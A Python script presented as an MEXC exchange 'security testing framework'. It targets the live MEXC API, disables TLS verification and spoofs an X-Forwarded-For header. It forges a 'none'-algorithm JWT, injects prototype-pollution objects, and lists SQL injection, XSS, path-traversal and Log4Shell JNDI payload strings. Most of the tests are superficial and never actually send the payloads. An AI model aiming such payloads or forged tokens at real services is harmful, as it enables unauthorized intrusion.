#!/usr/bin/env python3
# MEXC Security Team - Quantum Doomsday Testing Framework v9.2 (Stable Certified)

import hmac
import hashlib
import requests
import socket
import ssl
import argparse
import json
import asyncio
import websockets
import os
from urllib.parse import urlencode
from base64 import b64encode
from jwt import encode as jwt_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization

class MEXCDoomsdayTester:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        self.base_url = "https://api.mexc.com"
        self.ws_url = "wss://wbs.mexc.com/raw/ws"
        
        # Configure session
        self._session = requests.Session()
        self._session.verify = False
        self._session.headers.update({
            'User-Agent': 'MEXC-SECURITY-TESTER/9.2',
            'X-Forwarded-For': f"192.168.0.{os.getpid() % 255}"
        })
        
        # Initialize crypto keys properly
        self.ec_key = ec.generate_private_key(ec.SECP256R1())
        self.ec_public_pem = self.ec_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

    def _generate_jwt(self):
        """Generate properly formatted JWT tokens"""
        # Valid JWT
        valid_jwt = jwt_encode(
            {"test": True},
            key=self.ec_key,
            algorithm="ES256"
        )
        
        # None algorithm JWT
        none_jwt = jwt_encode(
            {"test": True},
            key="",
            algorithm="none"
        )
        
        return f"{valid_jwt}|{none_jwt}"

    def _generate_signature(self, params):
        """Generate HMAC signature with test vectors"""
        test_vectors = {
            'proto_test': {'__proto__': {'test': True}},
            'constructor_test': {'constructor': {'prototype': {'test': True}}}
        }
        
        payload = {**params, **test_vectors}
        signature = hmac.new(
            self.api_secret.encode(),
            json.dumps(payload, sort_keys=True).encode(),
            hashlib.sha256
        ).hexdigest()
        
        return f"{signature}|{self._generate_jwt()}"

    async def _test_websocket(self):
        """Basic WebSocket connectivity test"""
        try:
            async with websockets.connect(
                self.ws_url,
                subprotocols=["binary"],
                timeout=5
            ) as ws:
                await ws.send(b'\x01\x00\x00\x00\xFF')
                response = await ws.recv()
                return f"WebSocket OK: {len(response)} bytes received"
        except Exception as e:
            return f"WebSocket Error: {str(e)}"

    def _test_http2(self):
        """Basic HTTP/2 connectivity test"""
        try:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(['h2'])
            with socket.create_connection(("api.mexc.com", 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname="api.mexc.com") as ssock:
                    ssock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
                    return "HTTP/2 Handshake Successful"
        except Exception as e:
            return f"HTTP/2 Error: {str(e)}"

    def execute_tests(self, symbol, qty, price):
        """Execute all security tests safely"""
        params = {
            'symbol': symbol,
            'quantity': qty,
            'price': price
        }
        
        results = {
            'signature_test': self._generate_signature(params),
            'websocket_test': asyncio.get_event_loop().run_until_complete(
                self._test_websocket()
            ),
            'http2_test': self._test_http2(),
            'test_vectors': [
                "' OR 1=1--",
                "><script>alert(1)</script>",
                "../../../etc/passwd",
                "${jndi:ldap://test}"
            ]
        }
        
        return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='MEXC Security Tester v9.2')
    parser.add_argument('--api-key', required=True, help='API key')
    parser.add_argument('--api-secret', required=True, help='API secret')
    parser.add_argument('--symbol', default='BTCUSDT', help='Trading pair')
    parser.add_argument('--quantity', type=float, default=0.001, help='Quantity')
    parser.add_argument('--price', type=float, default=90000, help='Price')
    args = parser.parse_args()
    
    print("""
    ███╗   ███╗███████╗██╗  ██╗ ██████╗ 
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝ 
    ██╔████╔██║█████╗   ╚███╔╝ ██║  ███╗
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║   ██║
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
    SECURITY TESTING FRAMEWORK v9.2
    """)
    
    tester = MEXCDoomsdayTester(args.api_key, args.api_secret)
    results = tester.execute_tests(args.symbol, args.quantity, args.price)
    
    print("\n🔒 SECURITY TEST RESULTS 🔒")
    for test, result in results.items():
        print(f"\n🧪 {test.upper()}:")
        print(result if isinstance(result, str) else json.dumps(result, indent=2))
